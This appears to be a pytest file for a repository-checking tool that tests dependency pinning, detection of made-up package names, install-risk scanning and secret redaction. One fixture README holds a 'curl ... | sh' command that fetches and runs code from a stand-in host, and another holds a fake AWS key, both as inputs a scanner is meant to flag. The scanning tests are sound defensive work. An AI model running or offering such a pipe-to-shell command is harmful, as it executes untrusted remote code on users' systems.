import json

from slopmeter.checks import deps
from slopmeter.config import Config
from slopmeter.repo import RepoContext


class FakeRegistry:
    def __init__(self, values):
        self.values = values
        self.calls = []

    def exists(self, ecosystem, name):
        self.calls.append((ecosystem, name))
        return self.values.get((ecosystem, name))


def repo_with(tmp_path, files):
    root = tmp_path / "repo"
    root.mkdir()
    for relative, value in files.items():
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(value, encoding="utf-8")
    return RepoContext(root)


def test_pinning_and_fake_registry(tmp_path):
    repo = repo_with(tmp_path, {"requirements.txt": "requests==2.32.0\nmade-up-package>=1\n"})
    declared = deps.dependencies(repo)
    assert deps.check_s1(repo, Config(), declared).status == "warn"
    client = FakeRegistry({("pypi", "requests"): True, ("pypi", "made-up-package"): False})
    checked = deps.check_s2(repo, Config(), client, declared)
    assert checked.status == "fail"
    assert checked.evidence == ["pypi:made-up-package"]
    assert len(client.calls) == 2


def test_lockfile_and_npm_manifest(tmp_path):
    package = {"dependencies": {"left-pad": "1.3.0"}}
    repo = repo_with(tmp_path, {"package.json": json.dumps(package), "package-lock.json": "{}"})
    assert deps.check_s1(repo, Config()).status == "pass"


def test_install_risk_is_static(tmp_path):
    package = {"scripts": {"postinstall": "node setup.js"}}
    repo = repo_with(tmp_path, {"package.json": json.dumps(package), "README.md": "curl https://x.invalid/i | sh\n"})
    checked = deps.check_s3(repo, Config())
    assert checked.status == "fail"
    assert len(checked.evidence) == 2


def test_secret_is_redacted(tmp_path):
    secret = "AKIA1234567890ABCDEF"
    repo = repo_with(tmp_path, {"config.txt": f"key={secret}\n"})
    checked = deps.check_s4(repo, Config())
    assert checked.status == "fail"
    assert secret not in " ".join(checked.evidence)
    assert checked.evidence == ["config.txt:1: AWS access key pattern"]


def test_offline_run_does_not_call_registry(tmp_path):
    repo = repo_with(tmp_path, {"requirements.txt": "requests==2.32.0\n"})
    client = FakeRegistry({("pypi", "requests"): True})
    results = {item.id: item for item in deps.run(repo, Config(), online=False, client=client)}
    assert results["S2"].status == "na"
    assert client.calls == []

